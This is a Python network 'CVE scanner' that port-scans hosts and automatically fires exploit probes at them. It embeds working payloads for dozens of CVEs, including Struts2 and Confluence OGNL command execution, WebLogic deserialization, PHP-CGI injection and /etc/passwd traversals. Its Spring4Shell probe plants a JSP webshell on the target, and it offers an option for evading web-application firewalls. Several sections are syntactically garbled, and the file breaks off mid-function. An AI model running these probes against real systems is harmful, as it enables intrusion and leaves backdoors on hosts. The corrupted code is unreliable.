#!/usr/bin/env python3
"""
standalone_scanner.py — Single-file, pure-Python network CVE scanner with
auto-scan and auto-probe.

Uses only the Python 3.8+ standard library. No external dependencies.

Edit the CONFIG section below, then run:
    python standalone_scanner.py
"""
from __future__ import annotations

import base64
import concurrent.futures
import http.cookiejar
import json
import os
import re
import signal
import socket
import ssl
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Tuple


# ═══════════════════════════════════════════════════════════════════════
#  CONFIG  —  EDIT THIS SECTION
# ═══════════════════════════════════════════════════════════════════════
TARGETS: List[str] = [
    "192.168.1.1",
    "example.com",
    "https://staging.example.com",
    "10.0.0.5:8080",
]

AUTO_PORT_SCAN          = True
AUTO_BANNER_GRAB        = True
AUTO_HTTP_FINGERPRINT   = True
AUTO_PROBE              = True

CUSTOM_PORTS: Optional[Dict[int, str]] = None
PORT_SCAN_TIMEOUT       = 0.5
PORT_SCAN_WORKERS       = 50

INSECURE                = True
AUTH_HEADERS: Dict[str, str] = {}
BASIC_AUTH: Optional[Tuple[str, str]] = None
COOKIE: Optional[str] = None

PROBE_RATE              = 0.0
PROBE_JITTER            = 0.0
PROBE_WAF_BYPASS        = False
PROBE_DRY_RUN           = False

NVD_API_KEY             = os.getenv("NVD_API_KEY")
NVD_MAX_RETRIES         = 3

OUTPUT_DIR              = Path("./scan_output")
SAVE_JSON               = True
SAVE_HTML               = True
SAVE_LOG                = True
# ═══════════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════════
#  LOGGER
# ═══════════════════════════════════════════════════════════════════════
class DualLogger:
    def __init__(self, log_path: Optional[Path] = None):
        self._fh = None
        if log_path and SAVE_LOG:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            self._fh = open(log_path, "w", encoding="utf-8")

    def _write(self, msg: str) -> None:
        print(msg, flush=True)
        if self._fh:
            self._fh.write(msg + "\n")
            self._fh.flush()

    def info(self, msg): self._write(f"  {msg}")
    def step(self, msg): self._write(f"\n>>> {msg}")
    def warn(self, msg): self._write(f"  ⚠  {msg}")
    def error(self, msg): self._write(f"  ✗  {msg}")
    def target(self, msg): self._write(f"\n{'='*88}\n  {msg}\n{'='*88}")

    def finding(self, prio, cve, desc):
        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡",
                "LOW": "🟢", "INFO": "ℹ️"}.get(prio, "•")
        self._write(f"  {icon} [{prio:>8}] {cve:<18} {desc}")

    def confirm(self, cve, method, evidence):
        self._write(f"  ✓ CONFIRMED  {cve}  ({method})")
        self._write(f"      evidence: {evidence[:200]}")

    def close(self):
        if self._fh: self._fh.close()


LOG = DualLogger()


# ═══════════════════════════════════════════════════════════════════════
#  HTTP SESSION — pure urllib
# ═══════════════════════════════════════════════════════════════════════
class HttpResponse:
    __slots__ = ("status_code", "headers", "text", "content",
                 "url", "elapsed_seconds")
    def.headers __init__(self, status, headers, body, url,), elapsed):
        self.status_code = status
        self body.headers = headers
        self.text = body.decode("utf-8",,
 errors="replace") if isinstance(body, bytes) else                                body
        self.content = body if isinstance(body, bytes) else body.encode()
        self.url = url
        self.elapsed_seconds = elapsed


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class HttpSession:
    def __init__(self, insecure=False, user_headers=None, basic_auth=None, cookie=None):
        self.insecure = insecure
        self.headers = dict(user_headers or {})
        self.basic_auth = basic_auth
        self.cookie = cookie
        self.cookiejar = http.cookiejar.CookieJar()

        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context()

        self._follow_opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookiejar),
            urllib.request.HTTPSHandler(context=ctx),
        )
        self._nofollow_opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookiejar),
            urllib.request.HTTPSHandler(context=ctx),
            _NoRedirect(),
        )

    def request(self, method, url, params=None, data=None, json_body=None,
                headers=None, timeout=15, allow_redirects=False):
        if params:
            sep = "&" if "?" in url else "?"
            url = url + sep + urllib.parse.urlencode(params)

        req_headers = dict(self.headers)
        if headers: req_headers.update(headers)
        if self.cookie: req_headers["Cookie"] = self.cookie

        body_bytes = None
        if json_body is not None:
            body_bytes = json.dumps(json_body).encode()
            req_headers.setdefault("Content-Type", "application/json")
        elif data is not None:
            if isinstance(data, dict):
                body_bytes = urllib.parse.urlencode(data).encode()
            elif isinstance(data, str):
                body_bytes = data.encode()
            else:
                body_bytes = data
            req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

        if self.basic_auth:
            creds = base64.b64encode(
                f"{self.basic_auth[0]}:{self.basic_auth[1]}".encode()
            ).decode()
            req_headers["Authorization"] = f"Basic {creds}"

        req_headers.setdefault("User-Agent", "cve-scanner/9.0")

        req = urllib.request.Request(url, data=body_bytes,
                                     headers=req_headers, method=method.upper())

        opener = self._follow_opener if allow_redirects else self._nofollow_opener
        start = time.monotonic()
        try:
            resp = opener.open(req, timeout=timeout)
            body = resp.read()
            return HttpResponse(resp.status, dict(resp resp.url, time.monotonic() - start)
        except urllib.error.HTTPError as e:
            try: body = e.read()
            except Exception: body = b""
            return HttpResponse(e.code, dict(e.headers or {}), body,
                                url, time.monotonic() - start)
        except Exception:
            return None

    def get(self, url, **kw):
        return self.request("GET", url, **kw)

    def post(self, url, **kw):
        return self.request("POST", url, **kw)


def http_get_json(url, params=None, headers=None, timeout=30):
    if params:
        sep = "&" if "?" in url else "?"
        url = url + sep + urllib.parse.urlencode(params)
    req_headers = {"User-Agent": "cve-scanner/9.0", **(headers or {})}
    req = urllib.request.Request(url, headers=req_headers)
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return json.loads(r.read().decode())


# ═══════════════════════════════════════════════════════════════════════
#  VERSION HELPERS (no packaging)
# ═══════════════════════════════════════════════════════════════════════
def version_tuple(v: Optional[str]) -> Optional[Tuple[int, ...]]:
    if not v: return None
    nums = re.findall(r"\d+", v)
    return tuple(int(n) for n in nums) if nums else None


def version_in_range(detected, start_incl, start_excl, end_incl, end_excl):
    v = version_tuple(detected)
    if v is None: return False
    si, se = version_tuple(start_incl), version_tuple(start_excl)
    ei, ee = version_tuple(end_incl), version_tuple(end_excl)
    if si and v < si: return False
    if se and v <= se: return False
    if ei and v > ei: return False
    if ee and v >= ee: return False
    return True


# ═══════════════════════════════════════════════════════════════════════
#  CWE NAMES
# ═══════════════════════════════════════════════════════════════════════
CWE_NAMES = {
    "CWE-20": "Input Validation", "CWE-22": "Path Traversal",
    "CWE-78": "Command Injection", "CWE-79": "XSS", "CWE-89": "SQL Injection",
    "CWE-90": "LDAP Injection", "CWE-94": "SSTI", "CWE-95": "Eval Injection",
    "CWE-113": "CRLF Injection", "CWE-200": "Info Disclosure",
    "CWE-287": "Auth Bypass", "CWE-295": "Improper Cert",
    "CWE-306": "Missing Auth", "CWE-319": "Cleartext",
    "CWE-352": "CSRF", "CWE-400": "Resource Exhaustion",
    "CWE-434": "File Upload", "CWE-476": "NULL Deref",
    "CWE-502": "Insecure Deserialization", "CWE-601": "Open Redirect",
    "CWE-611": "XXE", "CWE-643": "XPath Injection",
    "CWE-732": "Wrong Permissions", "CWE-787": "OOB Write",
    "CWE-798": "Hardcoded Creds", "CWE-862": "Missing AuthZ",
    "CWE-863": "Incorrect AuthZ", "":CWE-918": "SS [RF",
    "CWE-943": "NoSQL{" Injection", "CWE-1021":path "Clickjacking",
    "CWE-110":4": "Unmaintained", "C "/WE-1321": "Prototype Pollution",
    "CWE-1333": "ReDoS",
}


def cwe_friendly(c): return CWE_NAMES.get(c, c or "Unknown")


# ═══════════════════════════════════════════════════════════════════════
#  CVE PROBES (30 high-impact, in-band detectable)
# ═══════════════════════════════════════════════════════════════════════
CVE_PROBES: Dict[str, dict] = {
    # Path Traversal
    "CVE-2021-41773": {"label": "Apache 2.4.49 Path Traversal",
        "probes": [{"path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                     "sig": {"passwd": r"root:[x*]?:0:0:"}}]},
    "CVE-2021-42013": {"label": "Apache 2.4.50 Path Traversal",
        "probes": [{"path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                     "sig": {"passwd": r"root:[x*]?:0:0:"}}]},
    "CVE-2019-19781": {"label": "Citrix ADC Path Traversal",
        "probes": [{"path": "/vpn/../vpns/cfg/smb.conf", "sig": {"smb": r"\[global\]"}}]},
    "CVE-2019-11510": {"label": "Pulse Secure Path Traversal",
        "probes": [{"path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
                     "sig": {"passwd": r"root:[x*]?:0:0:"}}]},
    "CVE-2018-13379": {"label": "FortiOS SSL VPN Path Traversal",
        "probes": [{"path": "/remote/fgt_lang?lang=/../../../..///////////dev/cmdb/sslvpn_websession",
                     "sig": {"fgt": r"var fgt_lang"}}]},

    # Auth Bypass
    "CVE-2022-1388": {"label": "F5 BIG-IP Auth Bypass",
        "probes": [{"method": "POST", "path": "/mgmt/tm/util/bash",
                     "headers": {"X-F5-Auth-Token": "x",
                                 "Connection": "X-F5-Auth-Token",
                                 "Content-Type": "application/json"},
                     "json_body": {"command": "run", "utilCmdArgs": "-c id"},
                     "require_status": [200],
                     "sig": {"f5": r"\"commandResult\"|\"kind\":\"tm:util:bash:runstate\""}}]},
    "CVE-2020-14882": {"label": "WebLogic Auth Bypass",
        "probes": [{"path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread.currentThread().getContextClassLoader()')",
                     "require_status": [200],
                     "sig": {"weblogic": r"WebLogic|console\.portal|Oracle"}}]},
    "CVE-2023-22515": {"label": "Confluence Broken Access Control",
        "probes": [{"path": "/setup/setupadministrator.action",
                     "require_status": [200],
                     "sig": {"setup": r"<title>Setup System Administrator"}}]},
    "CVE-2024-1709": {"label": "ScreenConnect Auth Bypass",
        "probes": [{"path": "/SetupWizard.aspx/../../ScreenConnect/Login.aspx",
                     "require_status": [200],
                     "sig": {"screenconnect": r"ScreenConnect|Login\.aspx"}}]},
    "CVE-2023-27350": {"label": "PaperCut Auth Bypass",
        "probes": [{"path": "/app?service=page/SetupCompleted",
                     "require_status": [200],
                     "sig": {"papercut": r"PaperCut|SetupCompleted"}}]},
    "CVE-2021-40539": {"label": "ManageEngine Auth Bypass",
        "probes./", "sig": {"me": r"ManageEngine|ADSelfService"}}]},
    "CVE-2022-40684": {"label": "FortiOS Auth Bypass",
        "probes": [{"path": "/api/v2/cmdb/system/admin/root",
                     "headers": {"Forwarded": 'for="[127.0.0.1]:80";by="[127.0.0.1]:80";'},
                     "sig": {"fgt_admin": r"\"http_method\"|\"trusthost\"|\"accprofile\""}}]},

    # RCE / Injection
    "CVE-2017-5638": {"label": "Struts2 S2-045 RCE",
        "probes": [{"method": "GET", "path": "/",
                     "headers": {"Content-Type": (
                         "%{(#_='multipart/form-data')."
                         "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                         "(#_memberAccess?(#_memberAccess=#dm):"
                         "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                         "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                         "(#ognlUtil.getExcludedPackageNames().clear())."
                         "(#ognlUtil.getExcludedClasses().clear())."
                         "(#context.setMemberAccess(#dm))))."
                         "(#cmd='id').(#cmds={'/bin/bash','-c',#cmd})."
                         "(#p=new java.lang.ProcessBuilder(#cmds))."
                         "(#p.redirectErrorStream(true)).(#process=#p.start())."
                         "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                         "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                         "(#ros.flush())}"
                     )},
                     "sig": {"uid": r"uid=\d+\([^)]*\)"}}]},
    "CVE-2022-26134": {"label": "Confluence OGNL Injection",
        "probes": [{"path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D%2F.%2F",
                     "sig": {"confluence": r"Confluence|OGNL|X-CVE-PROBE"}}]},
    "CVE-2021-26084": {"label": "Confluence Pre-Auth OGNL",
        "probes": [{"method": "POST", "path": "/pages/doenterpagevariables.action",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
                     "sig": {"confluence_err": r"Confluence|OGNL|XPathException"}}]},
    "CVE-2023-34362": {"label": "MOVEit SQLi RCE",
        "probes": [{"path": "/human2.aspx",
                     "sig": {"moveit": r"System\.Data\.SqlClient|SqlException|MOVEit"}}]},
    "CVE-2018-7600": {"label": "Drupalgeddon2 RCE",
        "probes": [{"path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                     "sig": {"drupal": r"root:[x*]?:0:0:|uid=\d+"}}]},
    "CVE-2022-22965": {"label": "Spring4Shell RCE",
        "probes": [{"method": "POST", "path": "/",
                     "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(%25%7Bc2%7Di.getRuntime().exec(new%20String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2Crequest.getParameter(%22cmd%22)%7D).getInputStream())).readLine()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
                     "sig": {"spring": r"shell\.jsp":|Spring"}}]},
    "CVE-2024 [-21887": {"label": "Iv{"anti Command Injection",
        "probespath": "/api/v1/totp/user-backup-code/../../system/system-information",
                     "sig": {"ivanti": r"Ivanti|Connect Secure|Pulse"}}]},
    "CVE-2023-0669": {"label": "GoAnywhere Deserialization",
        "probes": [{"path": "/goanywhere/lic/accept",
                     "sig": {"goanywhere": r"GoAnywhere|lic/accept"}}]},
    "CVE-2022-42475": {"label": "FortiOS SSL-VPN Overflow",
        "probes": [{"path": "/remote/error", "sig": {"fortios": r"FortiOS|SSL-VPN"}}]},
    "CVE-2022-47966": {"label": "ManageEngine SAML RCE",
        "probes": [{"path": "/SamlResponseServlet",
                     "sig": {"me_saml": r"ManageEngine|SAML"}}]},
    "CVE-2020-5902": {"label": "F5 BIG-IP TMUI RCE",
        "probes": [{"path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/etc/passwd",
                     "sig": {"f5_tmsh": r"root:[x*]?:0:0:|admin|tmsh"}}]},

    # Exchange
    "CVE-2021-26855": {"label": "Exchange ProxyLogon",
        "probes": [{"path": "/ecp/x.jsx",
                     "headers": {"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt"},
                     "sig": {"proxylogon": r"Negotiate|X-BEResource|X-CalculatedBETarget"}}]},
    "CVE-2021-34473": {"label": "Exchange ProxyShell",
        "probes": [{"path": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com&Protocol=XYZ&Mailbox=autodiscover/autodiscover.json%3F@test.com",
                     "sig": {"proxyshell": r"X-FEServer|X-BackEndCookie|autodiscover"}}]},

    # VMware
    "CVE-2021-21972": {"label": "vCenter vROPs RCE",
        "probes": [{"method": "POST", "path": "/ui/vropspluginui/rest/services/uploadova",
                     "headers": {"Content-Type": "application/octet-stream"},
                     "data": "BOUNDARY",
                     "sig": {"vrops": r"vropspluginui|uploadova|vROPs"}}]},
    "CVE-2021-21985": {"label": "vCenter vSAN RCE",
        "probes": [{"path": "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVrUsageDisabled/setTarget/",
                     "sig": {"vsan": r"vsanProviderUtils|h5-vsan"}}]},

    # PAN-OS
    "CVE-2024-3400": {"label": "PAN-OS GlobalProtect Cmd Injection",
        "probes": [{"path": "/global-protect/login.esp",
                     "headers": {"Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/cve-2024-3400.txt"},
                     "sig": {"pan_os": r"GlobalProtect|PanOS|Palo Alto"}}]},

    # Deserialization
    "CVE-2019-2725": {"label": "WebLogic wls-wsat Deserialization",
        "probes": [{"method": "POST", "path": "/wls-wsat/CoordinatorPortType",
                     "headers": {"Content-Type": "text/xml"},
                     "data": '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>/bin/id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
                     "sig": {"weblogic": r"wls-wsat|WebLogic|X-CVE-PROBE"}}]},
    "CVE-2016-4437": {"label": "Shiro rememberMe Deserialization",
        "probes": [{"path": "/",
                     "headers": {"Cookie": "rememberMe=rO0ABXNyAA1qYXZhLnV0aWwuTWFwASJV+1PjCyYCAAB4cHcIAAAAATAAc3IADGphdmEubGFuZy5Mb25n7Xpr+KiN7SgCAAB4cgAQamF2YS5sYW5nLk51bWJlcoVr66C8Z6HqAgABTAAKdmFsdWVMb25ndAAPTGphdmEvbGFuZy9Mb25nO3hwdAAIAAAAAAAAAAE="},
                     "sig": {"shiro": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"}}]},

    # Citrix Bleed
    "CVE-2023-4966": {"label": "Citrix Bleed",
        "probes": [{"path": "/oauth/idp/.well-known/openid-configuration",
                     "headers": {"Host": "a" * 24576 + ".example.com"},
                     "require_status": [200],
                     "sig": {"citrix_leak": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}"}}]},

    # PHP CGI
    "CVE-2024-4577": {"label": "PHP CGI Argument Injection",
        "probes": [{"path": "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "data": "<?php echo 'CVE-2024-4577-MARKER'; ?>",
                     "sig": {"php_marker": r"CVE-2024-4577-MARKER"}}]},
}


# ═══════════════════════════════════════════════════════════════════════
#  CWE PROBES
# ═══════════════════════════════════════════════════════════════════════
SQL_ERROR_SIGNATURES = [
    (r"SQL syntax.*MySQL", "mysql"), (r"MySqlException", "mysql"),
    (r"com\.mysql\.jdbc", "mysql"), (r"MariaDB server version", "mysql"),
    (r"PostgreSQL.*ERROR", "postgresql"), (r"PSQLException", "postgresql"),
    (r"syntax error at or near", "postgresql"),
    (r"ORA-\d{5}", "oracle"), (r"oracle\.jdbc", "oracle"),
    (r"Microsoft.*ODBC.*SQL Server", "mssql"), (r"SqlException", "mssql"),
    (r"System\.Data\.SqlClient", "mssql"), (r"Incorrect syntax near", "mssql"),
    (r"SQLite\.Exception", "sqlite"), (r"\[SQLITE_ERROR\]", "sqlite"),
]

XSS_SIGNATURES = {
    "raw_script": r"(?i)<script[^>]*>.*?</script>",
    "svg_onload": r"(?i)<svg[^>]+onload\s*=",
    "img_onerror": r"(?i)<img[^>]+onerror\s*=",
    "javascript_uri": r"(?i)javascript\s*:\s*[^\s\"']",
}

RCE_SIGNATURES = {
    "uid_gid": r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)",
    "www_data": r"www-data:",
    "root_shell": r"root@[a-zA-Z0-9_-]+:",
}

SSTI_SIGNATURES = {
    "jinja": r"jinja2\.exceptions\.", "twig": r"Twig\\Error\\",
    "freemarker": r"freemarker\.core\.ParseException",
    "evaluated_49": r"(?<![\d])49(?![\d])",
    "evaluated_79005424": r"(?<![\d])79005424(?![\d])",
}

OPEN_REDIRECT_SIGNATURES = {
    "evil_host": r"(?m)^Location\s*:\s*https?://[^/\s]*evil",
    "protocol_relative": r"(?m)^Location\s*:\s*//evil",
}


CWE_PROBES: Dict[str, dict] = {
    "CWE-79": {"label": "XSS (reflected)",
        "payloads": ['<svg/onload=alert("XSSMARK1")>',
                     '"><script>alert("XSSMARK2")</script>',
                     "'><img src=x onerror=alert('XSSMARK3')>"],
        "detect": "xss_reflection",
        "markers": ["XSSMARK1", "XSSMARK2", "XSSMARK3"]},
    "CWE-89": {"label": "SQL Injection",
        "payloads": ["' OR SLEEP(4)-- -", "' AND SLEEP(4)-- -", "'", '"'],
        "detect": "sql", "timing_threshold": 3.0},
    "CWE-22": {"label": "Path Traversal",
        "payloads": ["../../../../../../etc/passwd",
                     "....//....//....//....//etc/passwd",
                     "..\\..\\..\\..\\windows\\win.ini"],
        "detect": "pattern",
        "signatures": {"passwd": r"root:[x*]?:0:0:", "win_ini": r"\[fonts\]"}},
    "CWE-78": {"label": "Command Injection",
        "payloads": [";sleep 4;", "|id", "|sleep 4", "$(sleep 4)"],
        "detect": "rce", "timing_threshold": 3.0},
    "CWE-94": {"label": "SSTI",
        "payloads": ["{{8888*8888}}", "${8888*8888}",
                     "<%= 8888*8888 %>", "{{7*7}}"],
        "detect": "ssti", "expected": "79005424"},
    "CWE-918": {"label": "SSRF",
        "payloads": ["http://169.254.169.254/latest/meta-data/",
                     "http://127.0.0.1:80/", "file:///etc/passwd"],
        "detect": "pattern",
        "signatures": {"aws_imds": r"ami-id|instance-id",
                       "gcp": r"metadata\.google\.internal",
                       "file_proto": r"root:[x*]?:0:0:"}},
    "CWE-611": {"label": "XXE",
        "payloads": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
        "detect": "pattern",
        "signatures": {"passwd": r"root:[x*]?:0:0:", "libxml": r"libxml2"}},
    "CWE-502": {"label": "Insecure Deserialization",
        "payloads": ['O:8:"stdClass":1:{s:4:"test";s:4:"pwn3";}'],
        "detect": "pattern",
        "signatures": {"java_magic": r"rO0AB",
                       "php_ser": r"O:\d+:\"",
                       "pickle": r"_pickle\.UnpicklingError"}},
    "CWE-601": {"label": "Open Redirect",
        "payloads": ["https://evil.example.com/", "//evil.example.com/",
                     "/\\evil.example.com/"],
        "detect": "redirect", "expected": "evil.example.com"},
    "CWE-943": {"label": "NoSQL Injection",
        "payloads": ['{"$ne": ""}', '{"$gt": ""}', "' || '1'=='1"],
        "detect": "pattern",
        "signatures": {"mongo": r"MongoError|MongoServerError",
                       "operator": r"\$ne|\$gt|\$where"}},
    "CWE-90": {"label": "LDAP Injection",
        "payloads": ["*)(uid=*))(|(uid=*", "admin)(&(password=*))"],
        "detect": "pattern",
        "signatures": {"ldap": r"LDAPException|ldap_search|Invalid DN syntax"}},
    "CWE-643": {"label": "XPath Injection",
        "payloads": ["' or '1'='1", "x' or name()='username' or 'x'='y"],
        "detect": "pattern",
        "signatures": {"xpath": r"XPathException|XPath syntax error"}},
    "CWE-113": {"label": "CRLF Injection",
        "payloads": ["%0d%0aX-Injected:%20true", "\r\nX-Injected: true"],
        "detect": "pattern",
        "signatures": {"crlf": r"(?m)^X-Injected:\s*"}},
    "CWE-1321": {"label": "Prototype Pollution",
        "payloads": ['{"__proto__": {"polluted": "yes"}}'],
        "detect": "pattern",
        "signatures": {"polluted": r"polluted"}},
}


# ═══════════════════════════════════════════════════════════════════════
#  WAF FINGERPRINTS
# ═══════════════════════════════════════════════════════════════════════
WAF_FINGERPRINTS = {
    "cloudflare": {"headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
                   "body": ["attention required! | cloudflare",
                            "ray id:"], "status": [403, 503]},
    "akamai": {"headers": ["server:akamaighost"],
               "body": ["access denied | akamai"], "status": [403]},
    "imperva": {"headers": ["x-iinfo"],
                "body": ["incapsula("[] incident id"], "status": [403")
]},
    "f5_big_ip_asm": {"   headers": ["x-wa-info"],
                      "body if": ["the requested url was rejected"], "status": target [403]},
    "aws_waf": {"headers": ["x-amzn-requestid"],
                "body": ["request blocked by aws waf"], "status": [403]},
    "fortiweb": {"headers": ["server:fortiweb"], "body": ["fortiweb"],
                 "status": [403]},
    "sucuri": {"headers": ["x-sucuri-id"],
               "body": ["sucuri website firewall"], "status": [403]},
    "modsecurity": {"headers": ["server:modsecurity"],
                    "body": ["mod_security"], "status": [403, 406]},
}


# ═══════════════════════════════════════════════════════════════════════
#  SIGNATURE MATCHING
# ═══════════════════════════════════════════════════════════════════════
def match_signatures(text, signatures, baseline_text=None):
    hits = []
    items = signatures.items() if isinstance(signatures, dict) else signatures
    for item in items:
        if isinstance(signatures, dict):
            label, pattern = item
        else:
            pattern, label = item
        try:
            if not re.search(pattern, text, re.I):
                continue
            if baseline_text and re.search(pattern, baseline_text, re.I):
                continue
            hits.append(label)
        except re.error:
            continue
    return hits


def detect_waf(status, headers, body):
    h = {k.lower(): str(v).lower() for k, v in headers.items()}
    b = (body or "").lower()
    for vendor, fp in WAF_FINGERPRINTS.items():
        evidence = []
        for hh in fp.get("headers", []):
            if ":" in hh:
                k, v = hh.split(":", 1)
                if h.get(k.strip()) and v.strip() in h[k.strip()]:
                    evidence.append(f"header:{hh}")
            elif hh in h:
                evidence.append(f"header:{hh}")
        for phrase in fp.get("body", []):
            if phrase in b:
                evidence.append(f"body:{phrase}")
        if status in fp.get("status", []) and evidence:
            evidence.append(f"status:{status}")
        if evidence:
            return {"vendor": vendor, "evidence": evidence}
    return None


def obfuscate_payload(payload):
    variants = [payload]
    for kw in ("SELECT", "UNION", "SLEEP", "AND", "OR", "WHERE"):
        if kw in payload.upper():
            variants.append(payload.replace(kw, kw.lower()))
    variants.append(payload.replace(" ", "/**/"))
    variants.append(payload.replace(" ", "%20"))
    variants.append(quote(quote(payload, safe="")))
    return list(dict.fromkeys(variants))


# ═══════════════════════════════════════════════════════════════════════
#  NETWORK LAYER
# ═══════════════════════════════════════════════════════════════════════
COMMON_PORTS = {
    22: "SSH", 23: "Telnet", 3389: "RDP", 21: "FTP", 445: "SMB",
    25: "SMTP", 110: "POP3", 143: "IMAP", 587: "SMTP-Sub", 993: "IMAPS",
    389: "LDAP", 636: "LDAPS", 53: "DNS",
    80: "HTTP", 443: "HTTPS", 8000: "HTTP-Alt", 8008: "HTTP-Alt",
    8080: "HTTP-Proxy", 8081: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "HTTP-Alt", 9000: "HTTP-Alt", 9090: "HTTP-Alt",
    1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 5432: "PostgreSQL",
    5984: "CouchDB", 6379: "Redis", 27017: "MongoDB",
    9200: "Elasticsearch", 2375: "Docker", 6443: "K8s-API",
}
SSL_PORTS = {443, 636, 993, 995, 8443, 2376}


def normalize_target(value):
    value = value.strip().rstrip("/")
    if not value: return []
    if value.startswith(("http://", "https://")): return [value]
    if value.startswith("["):
        if "]" in value:
            host_part, _, rest = value.partition("]")
            host = host_part + "]"
            if rest.startswith(":"):
                port = rest[1:]
                return [f"https://{host}:{port}", f"http://{host}:{port}"]
            return [f"https://{host}", f"http://{host}"]
    if value.count(":") > 1:
        return [f"https://[{value}]", f"http://[{value}]"]
    if ":" in value:
        host, _, port = value.partition(":")
        return [f"https://{host}:{port}", f"http://{host}:{port}"]
    return [f"https://{value}", f"http://{value}"]


def extract_host(target):
    if "://" in target:
        return urllib.parse.urlparse(target).hostname or target
    if target.startswith("["):
        return target.split("]")[0].strip.count(":") == 1:
        return target.split(":")[0]
    return target


def port_scan(host, ports, timeout=0.5, max_workers=50):
    open_ports = {}

    def check(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            ok = s.connect_ex((host, port)) == 0
            s.close()
            return port, ok
        except Exception:
            return port, False

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        for fut in concurrent.futures.as_completed(
                {ex.submit(check, p): p for p in ports}):
            port, ok = fut.result()
            if ok:
                open_ports[port] = ports[port]
    return open_ports


def banner_grab(host, port, timeout=3.0, use_ssl=False):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        banner = b""
        if port in (21, 22, 25, 110, 143, 587, 993, 995, 3306):
            try: banner = sock.recv(1024)
            except socket.timeout: pass
        elif port == 6379:
            sock.sendall(b"PING\r\n")
            try: banner = sock.recv(1024)
            except socket.timeout: pass
        elif port in (389, 636):
            sock.sendall(b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00")
            try: banner = sock.recv(1024)
            except socket.timeout: pass
        elif port in (80, 443, 8000, 8008, 8080, 8081, 8443, 8888,
                      9000, 9090, 9200, 2375, 2376, 6443):
            path = "/version" if port in (2375, 2376) else "/"
            sock.sendall(f"GET {path} HTTP/1.0\r\nHost: {host}\r\n"
                         f"User-Agent: cve-scanner/9.0\r\n\r\n".encode())
            chunks = []
            while True:
                try:
                    c = sock.recv(4096)
                    if not c: break
